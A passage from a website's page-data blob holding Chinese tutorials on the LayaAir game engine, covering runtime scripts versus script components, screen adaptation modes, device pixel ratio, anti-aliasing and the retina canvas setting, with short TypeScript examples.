runtime脚本的生命周期函数只有四个：onawake（激活）、onenable（启用）、ondisable（禁用）、ondestroy（销毁），而 script脚本不止四个并且还带有鼠标、键盘、碰撞事件。\n\n\n# runtime脚本开发流程\n\n\n# 关联runtime脚本\n\n直接将runtime脚本拖拽到组件的runtime属性里，或者直接在runtime属性里输入runtime脚本的路径。\n\n\n\n# 编写runtime脚本\n\n编写runtime脚本需要注意的是\n\n * runtime脚本生命周期函数只有四个：onawake（激活）、onenable（启用）、ondisable（禁用）、ondestroy（销毁）\n * 没有script脚本的 属性可视化，因为本来就是继承自组件，不需要可视化\n\nexport default class listui extends laya.dialog {\n    constructor() { super(); }\n    onenable(): void {\n        //模拟数据结构\n        let arr = [{\n            "top": { "value": "1" },\n            "name": { "text": "玩家名字1", "fontsize": 30, },\n            "score": { "text": "100" }\n        }, {\n            "top": { "value": "2" },\n            "name": { "text": "玩家名字2", "fontsize": 30, },\n            "score": { "text": "90" }\n        }, {\n            "top": { "value": "3" },\n            "name": { "text": "玩家名字3", "fontsize": 30, },\n            "score": { "text": "80" }\n        }];\n\n        let _list = this.getchildbyname("_list") as laya.list;\n        _list.array = arr;\n\n        //刷新list\n        _list.refresh();\n    }\n    ondisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 发布模式对runtime脚本的影响\n\n之前在2.ide的使用#项目设置里提到过“场景的发布模式”，这里简单做一个总结：\n\n * “内嵌模式” 生成了场景类并将ui数据内嵌到类里，使用方便但是代码包体积大；\n * “加载模式” 也生成场景类但将所有ui数据放到一个ui.json里（ui数据从类里分离出来了），减少了代码包体积但需要提前加载大的ui.json；\n * 小游戏问世前常使用“内嵌模式”和“加载模式”，后来常使用“分离模式”和“文件模式”。\n * “分离模式” 也生成场景类但每个场景的ui数据有单独的场景数据文件，并且引擎是自动加载场景对应的场景数据文件；\n * “文件模式” 没有生成场景类（所以不能使用var要使用getchild操作子节点），只有场景数据文件并通过scene.load来加载使用，大大减少了代码包体积。\n * 建议是 将项目设置的发布模式设置为“文件模式”，如果某个场景的 层级复杂、操作频繁并使用了runtime脚本，getchild会很麻烦且效率低，那么可以 单独将这个场景的发布模式设置为“分离模式”，这样就可以使用var了；也就是绝大多数的场景使用“文件模式”，个别使用“分离模式”。\n\n\n# 两种方式的区别和应用场景\n\n\n# 区别\n\n * runtime脚本是 直接继承自组件 ，本组件直接就是this，其子节点获取方式是 getchildbyname 或者 分离模式下搭配var ；\n * script脚本是 继承自laya.script，本组件是 this.owner ，其子节点获取方式是 getchildbyname 或者使用 定义属性可视化来绑定子节点（type设置为node，将子节点拖拽到该自定义属性里）；\n * 如果两种方式不考虑其他而都使用getchildbyname来获取子节点，由于script脚本多一层owner，会导致效率会低一些；\n * 对比两种方式的生命周期图，会发现 script脚本的生命周期函数更多并且还自带鼠标、键盘和碰撞的方法，而 runtime脚本的生命周期函数只有四个：onawake（激活）、onenable（启用）、ondisable（禁用）、ondestroy（销毁）。\n\n\n# 应用场景\n\n * 像一些主场景、大的页面ui这样的，可能需要频繁地访问页面内多个元素（多为显示隐藏等类似简单逻辑），这样的应用场景下可以使用runtime脚本；\n * 如果主场景、大的页面ui里涉及到的业务很多且很复杂，像runtime脚本的四个生命周期函数和this.on复杂绑定方式满足不了开发需求，可以使用script脚本；当然，ui中具体的节点也会涉及到一些逻辑，这样的建议使用script脚本挂载。\n * 也就是说，像控制显示隐藏这样的简单逻辑的使用runtime脚本就足够了，更多地是涉及到复杂业务逻辑就使用script脚本（例如游戏总控制、角色控制等）。\n\n',charsets:{cjk:!0}},{title:"6.屏幕适配与抗锯齿",frontmatter:{title:"6.屏幕适配与抗锯齿"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/6.%E5%B1%8F%E5%B9%95%E9%80%82%E9%85%8D%E4%B8%8E%E6%8A%97%E9%94%AF%E9%BD%BF.html",relativePath:"book-web/LayaBox游戏引擎/6.屏幕适配与抗锯齿.md",key:"v-66c8ae85",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/6.%E5%B1%8F%E5%B9%95%E9%80%82%E9%85%8D%E4%B8%8E%E6%8A%97%E9%94%AF%E9%BD%BF.html",headers:[{level:2,title:"屏幕分辨率",slug:"屏幕分辨率",normalizedTitle:"屏幕分辨率",charIndex:56},{level:3,title:"物理分辨率",slug:"物理分辨率",normalizedTitle:"物理分辨率",charIndex:66},{level:3,title:"逻辑分辨率",slug:"逻辑分辨率",normalizedTitle:"逻辑分辨率",charIndex:165},{level:3,title:"缩放因子",slug:"缩放因子",normalizedTitle:"缩放因子",charIndex:252},{level:2,title:"屏幕适配基本概念",slug:"屏幕适配基本概念",normalizedTitle:"屏幕适配基本概念",charIndex:531},{level:3,title:"DPR",slug:"dpr",normalizedTitle:"dpr",charIndex:544},{level:3,title:"物理宽高、逻辑宽高",slug:"物理宽高、逻辑宽高",normalizedTitle:"物理宽高、逻辑宽高",charIndex:869},{level:3,title:"设计宽高",slug:"设计宽高",normalizedTitle:"设计宽高",charIndex:1192},{level:3,title:"画布宽高、舞台宽高",slug:"画布宽高、舞台宽高",normalizedTitle:"画布宽高、舞台宽高",charIndex:1544},{level:2,title:"抗锯齿",slug:"抗锯齿",normalizedTitle:"抗锯齿",charIndex:7},{level:3,title:"锯齿产生的原因",slug:"锯齿产生的原因",normalizedTitle:"锯齿产生的原因",charIndex:2087},{level:3,title:"引擎内置的抗锯齿",slug:"引擎内置的抗锯齿",normalizedTitle:"引擎内置的抗锯齿",charIndex:2216},{level:3,title:"抗锯齿失效的原因",slug:"抗锯齿失效的原因",normalizedTitle:"抗锯齿失效的原因",charIndex:2380},{level:3,title:"如何设置最佳画布",slug:"如何设置最佳画布",normalizedTitle:"如何设置最佳画布",charIndex:2547},{level:2,title:"理解适配基础",slug:"理解适配基础",normalizedTitle:"理解适配基础",charIndex:4081},{level:3,title:"对UI场景的设置",slug:"对ui场景的设置",normalizedTitle:"对ui场景的设置",charIndex:4092},{level:3,title:"缩放画布和舞台",slug:"缩放画布和舞台",normalizedTitle:"缩放画布和舞台",charIndex:4325},{level:2,title:"最容易理解的适配模式",slug:"最容易理解的适配模式",normalizedTitle:"最容易理解的适配模式",charIndex:4542},{level:3,title:"默认的不缩放模式noscale",slug:"默认的不缩放模式noscale",normalizedTitle:"默认的不缩放模式noscale",charIndex:4557},{level:3,title:"物理分辨率画布模式full",slug:"物理分辨率画布模式full",normalizedTitle:"物理分辨率画布模式full",charIndex:4889},{level:3,title:"强行拉伸全屏模式exactfit",slug:"强行拉伸全屏模式exactfit",normalizedTitle:"强行拉伸全屏模式exactfit",charIndex:5349},{level:2,title:"移动端推荐的屏幕适配模式",slug:"移动端推荐的屏幕适配模式",normalizedTitle:"移动端推荐的屏幕适配模式",charIndex:5480},{level:3,title:"保宽全屏模式fixedwidth",slug:"保宽全屏模式fixedwidth",normalizedTitle:"保宽全屏模式fixedwidth",charIndex:5551},{level:3,title:"保高全屏模式fixedheight",slug:"保高全屏模式fixedheight",normalizedTitle:"保高全屏模式fixedheight",charIndex:6111},{level:3,title:"保宽高全屏模式fixedauto",slug:"保宽高全屏模式fixedauto",normalizedTitle:"保宽高全屏模式fixedauto",charIndex:6183},{level:2,title:"其他适配模式",slug:"其他适配模式",normalizedTitle:"其他适配模式",charIndex:6585},{level:3,title:"肯定不被裁切的等比缩放模式showall",slug:"肯定不被裁切的等比缩放模式showall",normalizedTitle:"肯定不被裁切的等比缩放模式showall",charIndex:6596},{level:3,title:"肯定不留黑边的等比缩放模式noborder",slug:"肯定不留黑边的等比缩放模式noborder",normalizedTitle:"肯定不留黑边的等比缩放模式noborder",charIndex:6908},{level:2,title:"屏幕适配总结",slug:"屏幕适配总结",normalizedTitle:"屏幕适配总结",charIndex:7130},{level:3,title:"不缩放",slug:"不缩放",normalizedTitle:"不缩放",charIndex:4560},{level:3,title:"非等比缩放",slug:"非等比缩放",normalizedTitle:"非等比缩放",charIndex:5396},{level:3,title:"等比缩放前不对画布进行变换",slug:"等比缩放前不对画布进行变换",normalizedTitle:"等比缩放前不对画布进行变换",charIndex:7581},{level:3,title:"等比缩放前对画布进行变换",slug:"等比缩放前对画布进行变换",normalizedTitle:"等比缩放前对画布进行变换",charIndex:7759},{level:3,title:"另类的fixedauto",slug:"另类的fixedauto",normalizedTitle:"另类的fixedauto",charIndex:8067},{level:2,title:"刘海屏的适配",slug:"刘海屏的适配",normalizedTitle:"刘海屏的适配",charIndex:9174},{level:2,title:"自动横竖屏",slug:"自动横竖屏",normalizedTitle:"自动横竖屏",charIndex:9278},{level:3,title:"检测手机屏幕状态",slug:"检测手机屏幕状态",normalizedTitle:"检测手机屏幕状态",charIndex:9297},{level:3,title:"不更改屏幕none",slug:"不更改屏幕none",normalizedTitle:"不更改屏幕none",charIndex:9482},{level:3,title:"自动横屏horizontal",slug:"自动横屏horizontal",normalizedTitle:"自动横屏horizontal",charIndex:9563},{level:3,title:"自动竖屏vertical",slug:"自动竖屏vertical",normalizedTitle:"自动竖屏vertical",charIndex:9730}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"屏幕分辨率 物理分辨率 逻辑分辨率 缩放因子 屏幕适配基本概念 DPR 物理宽高、逻辑宽高 设计宽高 画布宽高、舞台宽高 抗锯齿 锯齿产生的原因 引擎内置的抗锯齿 抗锯齿失效的原因 如何设置最佳画布 理解适配基础 对UI场景的设置 缩放画布和舞台 最容易理解的适配模式 默认的不缩放模式noscale 物理分辨率画布模式full 强行拉伸全屏模式exactfit 移动端推荐的屏幕适配模式 保宽全屏模式fixedwidth 保高全屏模式fixedheight 保宽高全屏模式fixedauto 其他适配模式 肯定不被裁切的等比缩放模式showall 肯定不留黑边的等比缩放模式noborder 屏幕适配总结 不缩放 非等比缩放 等比缩放前不对画布进行变换 等比缩放前对画布进行变换 另类的fixedauto 刘海屏的适配 自动横竖屏 检测手机屏幕状态 不更改屏幕none 自动横屏horizontal 自动竖屏vertical",content:'# 屏幕适配与抗锯齿\n\n> 引擎官方讲解更为详细——《一篇了解LayaAir的屏幕适配，及有效抗锯齿》\n\n\n# 屏幕分辨率\n\n\n# 物理分辨率\n\n物理分辨率：硬件 屏幕上实际拥有的像素(物理像素、设备像素)以行数乘以列数表示的一种参数，又叫做“设备分辨率”。\n例如手机售卖时标注的屏幕分辨率1334 × 750这种参数。\n\n\n# 逻辑分辨率\n\n逻辑分辨率：软件 里使用的分辨率（逻辑像素、CSS像素），也是“行”乘以“列”的形式。\n不同的软件程序有不同的逻辑像素，例如在web里就是CSS像素。\n\n\n# 缩放因子\n\n早期一个逻辑像素对应一个物理像素，在后来屏幕显示技术得到提升，同样尺寸屏幕 其物理分辨率是以前的几倍，如果还是一个逻辑像素对应一个物理像素的话，显示出的图片会变小，要让显示的图片大小不变，那么一个逻辑像素要对应多个物理像素，也就是需要一个参数来维持物理分辨率和逻辑分辨率的转换关系，这个参数就是 缩放因子，写法：@2X、@3X ，转换关系： 物理分辨率=逻辑分辨率×缩放因子 。\n\n为什么不同样也提升逻辑分辨率，因为软件显示图片（绘制图片）的API使用的单位是不会随意变化的（因为有些屏幕还是老样子），也就是逻辑分辨率是不会改变的。\n\n\n\n\n# 屏幕适配基本概念\n\n\n# DPR\n\n手机应用常使用 缩放因子 ，对应在浏览器（Web页面）里是 设备像素比 (Device Pixel Ratio，简称 DPR )，也就是物理像素与逻辑像素之间的比率；LayaAir引擎中通过 Laya.Browser.pixelRatio 可以获得浏览器的DPR值。\n\n在浏览器里用户可以按住Ctrl然后使用鼠标滚轮来缩放页面（手机是双指扩张），这种并非是由DPR值来决定页面缩放，但在H5游戏中是不允许这样操作的并且还要通过逻辑分辨率来适配（获取当前机型的DPR，决定一个逻辑像素占用几个物理像素），所以要给页面进行一个限制：\n\n通过上面这段viewpot的配置，那页面在禁止用户手动缩放的同时，也会按设备的DPR进行自动缩放。\n\n\n# 物理宽高、逻辑宽高\n\n物理宽高：物理分辨率的宽和高上各有多少个物理像素(px)，也叫设备宽高or屏幕宽高；引擎获取物理宽高Laya.Browser.width、Laya.Browser.height\n\n逻辑宽高：逻辑分辨的宽和高上各有多少个逻辑像素(pt)；引擎获取逻辑宽高Laya.Browser.clientWidth、Laya.Browser.clientHeight\n\n\n\n说明：引擎中的 逻辑宽高 其实是封装了浏览器的 clientWidth和clientHeight，然后 物理宽高 是通过 逻辑宽高×DPR 计算出来的；但是像iPhone 8 Plus这种机型比较特殊，算出来跟实际上的还是有区别的（实际是2.6的比率）。\n\n\n# 设计宽高\n\n设计宽高：开发者在设计产品时采用的宽高，常采用750×1334，也就是iPhone6 7 8的物理分辨率\n\n怎么选择设计宽高：\n\n * 设计宽高 采用的是物理分辨率，因为Web最基础的像素单位还是物理像素点px；\n * 设计宽高 常选择750×1334，首先要去掉 过时 的机型例如iphone4这种，然后再看 分辨率宽高比，大概分为 1:1.78的非全面屏机 和 1:2.17全面屏机，其他机型也比较接近这两种；其次看 性能，因为像素太多引擎性能会低一些，所以选择1:1.78的；最后去掉了 Plus特殊机型，再选择 稍流行 的机型，那就是750×1334了。（目前推荐是750×1334，如果750×1334完全过时了，估计就会选择设计宽高大一点的了）\n\n设置设计宽高的方式：\n\n\n\n# 画布宽高、舞台宽高\n\n画布宽高：画布（<canvas>）是Laya引擎绘制的基础，好比是画画的纸；画布有width、heigth两个属性，也就是 画布宽高 。\n\n画布宽高的值对画面最终的 清晰度以及性能 都会产生影响，甚至 边缘锯齿或画面模糊 也与画布宽高值有关。\n在noscale、exactfit、noborder这几个适配模式下 画布宽高会直接采用设计宽高值，而其它适配模式下，会根据适配规则产生变化。\n\n查看画布宽高的方式：\n\n\n舞台宽高：基于Laya引擎开发的所有可见元素都是 添加到舞台(stage)上 才能被显示的；舞台是显示列表的 根节点，也是最顶级的父容器；它也有width、heigth两个属性，也就是 舞台宽高 。\n\n舞台宽高的变化 并不会影响到画面显示的大小，但stage范围内，可以控制 显示，可以进行 事件监听，碰撞检测 等。\n像full、fixedwidth、fixedheight、fixedauto这些适配模式可以做到 Stage全覆盖。\n\n画布与舞台的关系： 画布处于最底层，舞台一定是在画布内显示的，也就是说画布宽高必须 大于或等于舞台的宽高；\n如果舞台的宽高超出了画布的宽高，即使舞台上有显示内容也会 被裁切掉无法显示。\n\n\n# 抗锯齿\n\n\n# 锯齿产生的原因\n\n图象是像素点按照行与列的矩阵这样的方式展示的，假如基于单个像素点画横着或竖着的直线，可以看到它比较平整，而画斜线或者曲线，会看到它并不平整像锯齿一样；在屏幕适配时难免不会进行缩放操作，这样会使得一些画面模糊也就是锯齿感比较强烈。\n\n\n\n# 引擎内置的抗锯齿\n\ninit()前，设置 Config.isAntialias=true; 这样就可以把一些边缘的锯齿模糊掉（弱化），在高分辨率的机器上基本就看不到这样的锯齿了，在低分辨率可能还会看到；\n在2D上是默认关闭这个设置的，除非使用了很多矢量图（尽量别用因为性能不好），可以开启这个设置，3D是默认开启的。\n\n\n\n# 抗锯齿失效的原因\n\n3D虽然默认是开启isAntialias这样的抗锯齿功能，但有些情况下发现抗锯齿功能没有生效。通常有两个原因：\n\n * Camera从Unity导出时不小心勾选了HDR，如果不想重新导出Camera可以在Laya引擎里关闭HDR，如下图\n   \n * 后期处理管线的BloomEffect泛光效果\n   \n\n\n# 如何设置最佳画布\n\n引擎的抗锯齿功能只是通过一些算法，让边缘过渡的更平滑，从而减轻锯齿现象，在一些像素密度比较大的屏幕上，让肉眼难以识别，并非真的让锯齿消失。\n\n在屏幕适配时，总会有机型不满足，所以会拉伸缩放一些UI，这就会导致 锯齿感的加剧，使得开启了抗锯齿功能也无法完全抵消这些锯齿，所以要考虑让画 一直处于物理分辨率的大小（画布 最佳高清状态 ）。\n\n 1. 让画布处于最佳高清有两种方式：\n    \n    * full屏幕适配模式 ，该模式会无视设计宽高的配置，直接采用物理分辨率作为画布宽高；\n    * 使用 视网膜画布模式 ，视网膜画布模式开启后，无论采用什么适配模式，都会强制将画布设置为当前机型的物理分辨率大小。\n\n 2. 如何开启“视网膜画布模式”？有两种设置方式：\n    \n    * 在初始化舞台init()前添加一行配置代码\n    \n    Config.useRetinalCanvas = true;\n    \n    \n    1\n    \n    * 如果想动态控制视网膜画布模式的开和关，也可以用另一种设置模式，在init()后添加配置代码\n    \n    Laya.stage.useRetinalCanvas = true;\n    \n    \n    1\n    \n\n 3. 动态控制“视网膜画布模式”的开启和关闭 如果不是在init()的同一帧内使用useRetinalCanvas模式配置的，要先修改 scaleMode、width、height、alignH、alignV 中任意一个的值，可以触发引擎的 setScreenSize 方法，这样才会 让Laya.stage.useRetinalCanvas的修改生效。\n    \n    if (condition) {\n        Laya.stage.useRetinalCanvas = false;\n    } else {\n        Laya.stage.useRetinalCanvas = true;\n    }\n    Laya.stage.alignH = "left";\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 4. 开启“视网膜画布模式”的利弊\n    \n    > 理论上讲，开启视网膜画布模式，在超出设计宽高的机型上，会产生更多的性能消耗。因为画布上的像素越多，性能消耗越大。所以很多2D游戏，都会采用相对小一些的分辨率作为游戏设计宽高。\n    > \n    > 但从实际应用来讲，物理宽高所带来的性能压力也并没有那么多风险。要知道，一些小游戏平台是强制要求必须物理分辨率的。因此，LayaAirIDE在导出QQ，vivo、OPPO、支付宝小游戏平台版本的时候，会强行开启视网膜画布模式（useRetinalCanvas）。在微信小游戏中，有的适配模式，如果不采用视网膜画布模式，那游戏画面布局效果将会与浏览器中表现不一样。\n    > \n    > 另外，开启视网膜画布模式，除了能解决一些小游戏平台中的问题，以及可以减轻锯齿现象外，其实还可以让适配变的更简单。因为不使用视网膜画布模式，还想避免锯齿现象，移动端只能使用full模式，而full模式除了让画布和舞台采用了物理分辨率之外，并没有作任何适配，所以对于2D UI，全部需要开发者手工适配。\n    > \n    > 所以，建议开启视网膜画布模式，尤其是3D游戏。如果考虑某些机型的性能压力，开发者可以在存在压力的机型，或者有性能压力的功能上，通过逻辑控制，动态开启或关闭视网膜画布模式。\n\n\n# 理解适配基础\n\n\n# 对UI场景的设置\n\nUI场景：一个游戏在各种情况下显示的场景（主页大厅、战斗场景），一般使用视图类组件中的Scene组件来实现的。\n\n游戏场景肯定是要铺满引擎画布或者舞台的（不铺满会留下黑边或白边等），那就在 创建UI场景时让它的宽高与设计宽高（F9项目设置）保持一致 。\n\n而设计宽高采用750×1334的物理分辨率，对其他不同物理分辨率机型肯定是要适配的，可以通过Laya引擎 对画布或舞台 进行 缩放、对齐、旋转 等一系列方式从而达到屏幕的全屏适配。\n\n\n# 缩放画布和舞台\n\n要想占满全屏最基本的策略就是 缩放，对画布或者舞台进行缩放；\n对画布的缩放，会改变整个场景UI中的 所有可见内容的大小，并会导致 画面出现模糊的现象（拉伸式的缩放），所以对画布的缩放一般是将画布设置成 最佳高清状态（视网膜画布模式），这样就不会使画面模糊了；\n而对舞台的缩放不会影响到画面显示大小，但会影响到可绘制区域和事件响应区域；屏幕适配主要考虑的是缩放舞台，因为画布一般都是开启了“视网膜画布模式”。\n\n\n# 最容易理解的适配模式\n\n\n# 默认的不缩放模式noscale\n\n引擎默认的适配模式是“不缩放模式noscale”，该模式不会缩放画布和舞台（UI场景当然也没有缩放），它们仍然是设计宽高的大小750×1334，这种适配模式下的舞台在iphone5这样的机型上会被裁剪，而在iphone6 7 8这些机型上刚好占满，在全面屏iphoneX 11会多出 白色 底边来（屏幕的颜色）。\n\n\n如果使用noscale模式，在iphone X这个机型上屏幕大小是1125×2436，此时画布和舞台没有缩放仍是750×1334，并处于屏幕的左上角，如果需要让画布处于屏幕的正中央，可以在项目设置F9里让“垂直对齐模式”选择middle，“水平对齐模式”选择center，这种就叫做 “画布对齐方式”。\n\n\n# 物理分辨率画布模式full\n\n“物理分辨率画布模式full”也不缩放画布和舞台，但会让这两个始终等于当前机型的物理分辨率大小，也就是说屏幕、画布和舞台始终都一样大；但是UI场景还是按照设计宽高750×1334这样开发的，那么UI场景在iphone5这样的机型上会被裁剪，而在iphone6 7 8这些机型上刚好占满，在全面屏iphoneX 11会多出 黑色 底边来（画布的颜色）。\n\n\n如果使用full模式，可以对舞台里的UI场景进行 相对布局 （这意味着放弃了设计宽高）；将UI场景 由Scene改为View（添加Widget组件也可），再让UI场景的 left、right、top和bottom设置为0或者合适的数值，这样的话就可以在不同物理分辨的机型上达到 占满全屏 的效果。\n\n注意：noscale模式下开启“视网膜画布模式”，与full模式视觉效果上一样，不同的是noscale模式舞台没有那么大，所以noscale模式 舞台外面的区域无法接受事件，full模式的舞台和画布一样大，事件一直能接受到。\n\n\n# 强行拉伸全屏模式exactfit\n\n“强行拉伸全屏模式exactfit”，对画布和舞台都进行了非等比缩放，显示前画布和舞台还是设计宽高的大小750×1334，只是在显示出来的时候强行拉伸或者挤压至全屏（非等比缩放），在各种机型上都可以，不会留出底边。\n\n\n\n# 移动端推荐的屏幕适配模式\n\n移动端里可以按照宽或者高来对画布舞台进行的等比缩放，不会像exactfit模式一样就是强制非等比的缩放。\n\n\n# 保宽全屏模式fixedwidth\n\n“保宽全屏模式fixedwidth”，首先保证画布和舞台的 宽度不变(750)，然后按照“设备宽/画布宽”算出 比例，再用“设备高/比例”算出画布 最终 高度，让画布和舞台的高度设置成这个值（例如iphone X算出来的是1624，那就得让原先的1334变为1624），在显示时将 最终的画布宽高按照比例缩放，刚好是占满全屏的；但是UI场景还是按照设计宽高750×1334这样开发的，那么UI场景在iphone5这样的机型上的 上下两边 会被裁剪，而在iphone6 7 8这些机型上刚好占满，在全面屏iphoneX 11的 上下两边 会多出 黑色 底边来（画布的颜色，因为画布是加长了再等比缩放的）。\n\n\n在iPhone X上使用 fixedwidth 模式：设备宽高是1125×2436，画布和舞台宽 保持750不变，1125/750=1.5，2436/1.5=1624，那么画布和舞台 最终 宽高是 750×1624 （其实UI的高没有跟着变化，但后面会跟着画布等比缩放），显示时按照1.5的比例将画布和舞台缩放至1125×2436，但UI之前还是750×1334，UI跟着画布等比缩放后，在页面上明显会看到上下两边留出黑色底边了，那就需要对UI的上下进行相对布局了。\n\n\n# 保高全屏模式fixedheight\n\n“保高全屏模式fixedheight”，跟fixedwidth原理一样，就是要优先保证高度不变。\n\n\n# 保宽高全屏模式fixedauto\n\n“保宽高全屏模式fixedauto”，其实采用的就是fixedwidth或者fixedheight，有一个选择规则，如果 物理宽高比 小于 设计宽高比 的话采用fixedwidth模式，否则就采用fixedheight，其实就是 永远不会 让UI被裁剪会一直留出 黑边（画布），然后让UI进行相对布局。\n\nfixedxxx模式下留出的黑边怎么解决？\n开发人员要 尽可能 将各种机型在fixedxxx模式下的 最终 的设计宽高（例如750×1624这种数据）计算出来，然后从中选择一个可以 尽可能覆盖所有情况 的宽高，将这个宽高提供给美术让他们设计一个背景图，这个背景图就可以遮住fixedxxx模式多出的 黑边，背景解决了再让UI进行一些适配（比如 相对布局），这样就完成了移动端的适配了。\n如果是纯色的背景直接动态改变它的大小或者用相同颜色的背景进行拼接。\n\n\n# 其他适配模式\n\n\n# 肯定不被裁切的等比缩放模式showall\n\n“肯定不被裁切的等比缩放模式showall”，它会取“设备高/设计高”和“设备宽/设计宽”这两者中的 最小值 作为比例，让画布和舞台的当前宽高也就是750×1334按照这个比例进行等比缩放；缩放后与当前设备宽高比，肯定有一边会留出白边（屏幕），但肯定不会被裁切。\n\n\nshowall模式做不到手机全屏适配，所以通常不会被用到手机适配上， 在PC浏览器运行的横屏页游，可以使用该模式。\nshowall模式由于画布宽高已经进行了缩放改变，本身就是高清的适配模式，所以这种模式无需使用视网膜画布模式（useRetinalCanvas），用了之后画布采用了物理分辨率，反而不好。\n\n\n# 肯定不留黑边的等比缩放模式noborder\n\n“肯定不留黑边的等比缩放模式noborder”，它会取“设备高/设计高”和“设备宽/设计宽”这两者中的 最大值 作为比例，让画布和舞台的当前宽高也就是750×1334按照这个比例进行等比缩放；缩放后与当前设备宽高比，肯定有一边会被裁切，但肯定不会留黑边。\n\n\n虽然说该模式，通过相对布局二次适配，也可以让被裁剪的按钮等回归到屏幕内容之中，但二次适配的方式要更加复杂。所以不推荐使用该模式。\n\n\n# 屏幕适配总结\n\n屏幕的适配方案其实可以归结于这几种：不缩放的、非等比缩放的、等比缩放的（缩放前画布改不改变）\n\n\n# 不缩放\n\nnoscale和full对画布和舞台都没有进行缩放，要么是保持原样的(noscale)但是高清屏里会留 巨大的白边（小屏会被裁剪），要么是直接等于设备宽高(full)但是UI场景没有改变会留 巨大的黑边（小屏会被裁剪）。\n留出巨大的白边或者黑边就是因为 UI场景没有跟着 画布和舞台进行缩放，所以适配都 不会使用这两种模式 ，因为还需要自己对UI场景进行大量适配更改。\n\nPS：一定要理解full的是直接设置画布的宽高，并 不是缩放 到设备宽高，UI场景 根本就没有变化（单纯改变画布宽高影响不到UI场景，除非是对画布缩放）。\n\n\n# 非等比缩放\n\nexactfit非等比缩放是一种 粗暴 的方式，直接将设计宽高 缩放 至设备宽高，它不会留边但是会 拉伸页面，因为UI也跟着非等比缩放了，画面已经 变形 了，所以适配也 不会使用这种模式（除非跟别的方案搭配使用）。\n\n\n# 等比缩放前不对画布进行变换\n\n在高清屏上，设计宽高和设备宽高是不成等比的，缩放前 不对画布进行处理，直接按照 设备宽高比 进行缩放，缩放后要么留出 白边 要么 被裁剪；具体就分为showall“展示了全部画布但画布还是比屏幕小（留白边了）”、noborder“不会留白边因为画布超过屏幕区域了”，这两种基本也不会用（PC端可以用showall）。\n\n\n# 等比缩放前对画布进行变换\n\n在高清屏上，设计宽高和设备宽高是不成等比的，可以提前将画布宽高比 强制改变成和设备宽高比一样的，后面就可以进行等比缩放了；这样就需要对画布的宽或高进行 增大 或者 减小，具体就分为：fixedwidth“保宽去增大或减小画布高”、fixedheight“保高去增大或减小画布宽”、fixedauto“增大画布其中的一边”。移动端比较适合使用fixedxxx，UI场景占不满画布或者被裁剪，可以使用相对布局解决。\n\nPS：这里的“增大”、“减小”是缩放前改变画布大小（UI场景大小没变），“缩放”是通过tansform的matrix对画布舞台进行缩放变换的（UI场景跟着缩放了）。\n\n\n# 另类的fixedauto\n\nfixedauto是“增大画布其中的一边”，那么可不可以使用“减小画布其中的一边”这种方式来处理缩放前的画布呢？ 当然也是可以的，很多游戏采用fixedauto或者这种 另类的fixedauto 来适配的。\n\n另类的fixedauto ：“物理宽高比” 大于 “设计宽高比”的话，采用fixedwidth模式，否则就采用fixedheight。\n\n像fixedauto这些模式的逻辑是 在Laya内部实现的，而另类的fixedauto就 需要自己实现 了，在init()前先采用“减小画布其中的一边”来处理画布，让它的 最终的宽高 与设备宽高形成等比的关系，最后再搭配引擎的 exactfit适配模式 就可以进行等比缩放了。\n\n大概实现： 先设置“F9项目设置”里的设计宽高，一般是750×1334\n\nlet desginW = GameConfig.width; // “F9项目设置”里的设计宽高\nlet desginH = GameConfig.height; // “F9项目设置”里的设计宽高\nconst bw = Browser.width; // 设备宽高\nconst bh = Browser.height; // 设备宽高\nif ((bw / bh) > (desginW / desginH)) {\n  desginH = bh * (desginW / bw); // 等比转换关系\n} else {\n  desginW = bw * (desginH / bh); // 等比转换关系\n}\n// 另类的fixedauto在如果正常流程下，最后UI肯定是被裁剪，那么这里提前算出UI该缩放的值，\n// 最后手动让UI去缩放到这个值，就可以让UI都处于画布内，但是处理完后还是需要对UI进行相对布局（也可以不缩放UI直接相对布局）\nconst UIScale = Math.min(desginH / GameConfig.height, desginW / GameConfig.width);\n// 引擎初始化\nLaya.init(GameConfig.width, GameConfig.height, WebGL);\n// 引擎使用exactfit适配模式\nLaya.stage.scaleMode = \'exactfit\';\n// 后续的onResize里最好也要重新计算一下desginH和desginW对GameConfig进行重新赋值，这是为了PC端\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 刘海屏的适配\n\n使用 Browser.clientHeight / Browser.clientWidth > 2 （逻辑高/逻辑宽）可以识别识别全面屏或刘海屏，然后对一些UI使用 相对布局 去处理\n\n\n# 自动横竖屏\n\n横竖屏官方讲解\n\n\n# 检测手机屏幕状态\n\n使用 Laya.Browser.height / Laya.Browser.width > 1 （物理高/物理宽）可以监测手机屏幕状态，大于1是竖屏，小于1是横屏。\n\nlaya.display.Stage中有个screenMode属性，有三个值："none"不更改屏幕、"horizontal" 自动横屏、"vertical" ：自动竖屏。\n\n\n# 不更改屏幕none\n\n默认值none或者不设置screenMode属性时，游戏的水平方向一直跟浏览器水平方向保持一致（浏览器旋转游戏跟着旋转）（适合）。\n\n\n# 自动横屏horizontal\n\n如果screenMode属性值设置为horizontal时，无论屏幕方向如何旋转，游戏的水平方向都会与屏幕最短的边始终保持垂直（适合传奇类横屏游戏）。\n\n横屏游戏的输入法：屏幕是竖屏的时候，游戏是横屏的，但输入法是竖屏的那就建议给输入法到顶部的距离做一个 竖屏的背景 ，不做背景也可以给提示。\n\n\n# 自动竖屏vertical\n\n如果screenMode属性值设置为vertical时，无论屏幕方向如何旋转，游戏的水平方向都会与屏幕较长的边始终保持垂直（适合泡泡龙竖屏游戏）。',normalizedContent:'# 屏幕适配与抗锯齿\n\n> 引擎官方讲解更为详细——《一篇了解layaair的屏幕适配，及有效抗锯齿》\n\n\n# 屏幕分辨率\n\n\n# 物理分辨率\n\n物理分辨率：硬件 屏幕上实际拥有的像素(物理像素、设备像素)以行数乘以列数表示的一种参数，又叫做“设备分辨率”。\n例如手机售卖时标注的屏幕分辨率1334 × 750这种参数。\n\n\n# 逻辑分辨率\n\n逻辑分辨率：软件 